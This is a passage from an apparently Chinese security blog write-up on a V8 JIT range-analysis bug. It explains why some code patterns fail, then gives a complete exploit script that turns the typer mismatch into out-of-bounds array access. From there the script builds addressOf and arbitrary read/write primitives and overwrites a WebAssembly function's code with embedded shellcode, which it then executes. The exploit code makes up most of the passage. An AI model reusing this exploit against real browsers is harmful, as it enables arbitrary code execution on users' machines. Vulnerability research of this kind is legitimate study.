[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010e30c9f64a344b51.png)

这将导致`var x = i &lt; 1 ? 1 : i`这个`Phi`节点与`i`的估测一致，同为`Range(-INF,INF)`，因为从程序的流程分析来看，显然`i &lt; 1`是恒不成立的，因为刚刚循环退出的条件就是`i &gt;= 1`，因此，`var x = i &lt; 1 ? 1 : i`就相当于`var x = i`，在后面，编译器直接评估它与i的情况一样，同为`Range(-inf,inf)`，由此不能达到我们的利用目的。同理，`var x = i &gt; 1 ? i : 1;`也不可行，它将使得i为`NaN`时，x的值为1。

### <a class="reference-link" name="exp%E7%BC%96%E5%86%99"></a>exp编写

控制好对象布局，利用JIT的oob，覆写后方`Array`的length，从而构造一个自由溢出的`OOB Array`，然后后续就是简单的利用了。

```
var buf = new ArrayBuffer(0x8);
var dv = new DataView(buf);

function p64f(value1,value2) `{`
   dv.setUint32(0,value1,true);
   dv.setUint32(0x4,value2,true);
   return dv.getFloat64(0,true);
`}`

function i2f64(value) `{`
   dv.setBigUint64(0,BigInt(value),true);
   return dv.getFloat64(0,true);
`}`

function u64f(value) `{`
   dv.setFloat64(0,value,true);
   return [dv.getUint32(0,true),dv.getUint32(4,true)];
`}`

function big2int(value) `{`
   dv.setBigUint64(0,BigInt(value),true);
   return dv.getUint32(0,true);
`}`

var a;
var oob_arr;
function opt(index,leak_or_write,val) `{`
    a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8];
    oob_arr = new Array(1.1,2.2);
    var x = -Infinity;
    var i = 0;
    for (; i &lt; 1; i += x) `{`
        if (i == -Infinity) x = +Infinity;
    `}`
    //compiler:Range(1,INF)
    //reality:NaN
    var x = Math.max(i,1); //
    //compiler:Range(-INF,-1)
    //reality:NaN
    x = -x; //
    //compiler:Range(-2,-1)
    //reality:NaN
    x = Math.max(x,-2); //
    //compiler:Range(-2,-1)
    //reality:0
    x &gt;&gt;= 0; //
    //compiler:Range(0,1)
    //reality:2
    x += 2;
    //compiler:Range(0,7)
    //reality:Range(0,7)
    index &amp;= 0x7;
    //compiler:Range(0,7)
    //reality:Range(0,14)
    index *= x;
    /*两步的作用是清除符号位*/
    index &lt;&lt;= 1;
    index &gt;&gt;= 1;
    if (leak_or_write)
       return a[index];
   else `{`
      a[index] = val;
   `}`
`}`


for (var i=0;i&lt;0x20000;i++) `{`
   opt(7,true,i+1.1);
   opt(7,false,p64f(0,0));
`}`

//泄露arr的elements,用于覆写length时不破坏elements
var d = u64f(opt(7,true,1.1));
var elements_addr = d[0];
print("elements_addr=" + elements_addr.toString(16));

var oob_len = p64f(elements_addr,0x1000);
opt(7,false,oob_len);
var float64_arr = new Float64Array(1.1,2.2,3.3);
var arb_buf = new ArrayBuffer(0x10);
var obj_arr = [buf];

compression_high = u64f(oob_arr[0x32])[0];
obj_elements_map_addr = u64f(oob_arr[0x3c])[1];
double_elements_map_addr = u64f(oob_arr[0x22])[1];
print("compression_high=" + compression_high.toString(16));
print("obj_elements_map_addr=" + obj_elements_map_addr.toString(16));
print("double_elements_map_addr=" + double_elements_map_addr.toString(16));


function addressOf(mobj) `{`
   obj_arr[0] = mobj;
   oob_arr[0x3c] = p64f(0,double_elements_map_addr);
   var addr = BigInt(u64f(obj_arr[0])[0]) - 0x1n + (BigInt(compression_high) &lt;&lt; 32n);
   oob_arr[0x3c] = p64f(0,obj_elements_map_addr);
   return addr;
`}`

/*print(addressOf(buf).toString(16));
//%DebugPrint(buf);
%SystemBreak(); */
const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x68n;
print(wasm_shellcode_ptr_addr.toString(16));

oob_arr[0x36] = p64f(0,0x100);
oob_arr[0x37] = p64f(0,big2int(wasm_shellcode_ptr_addr));
oob_arr[0x38] = p64f(compression_high,0);
var adv = new DataView(arb_buf);
var wasm_shellcode_addr = adv.getBigUint64(0,true);
print('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));

oob_arr[0x37] = p64f(0,big2int(wasm_shellcode_addr));
oob_arr[0x38] = p64f(big2int(wasm_shellcode_addr &gt;&gt; 32n),0);
//替换wasm的shellcode
for (var i=0;i&lt;shellcode.length;i++) `{`
   adv.setUint32(i*4,shellcode[i],true);
`}`
//执行shellcode
func();

/*%DebugPrint(wasmInstance);
%DebugPrint(oob_arr);
%DebugPrint(arb_buf);
%SystemBreak();
*/
```



## 0x04 感想

最近研究v8越来越上手了，以后还得继续努力。



## 0x05 参考

[论文Interprocedural Induction Variable Analysis](https://www.docin.com/p-1633488008.html)<br>[chromium commit](https://chromium.googlesource.com/v8/v8.git/+/a2e971c56d1c46f7c71ccaf33057057308cc8484%5E!/)
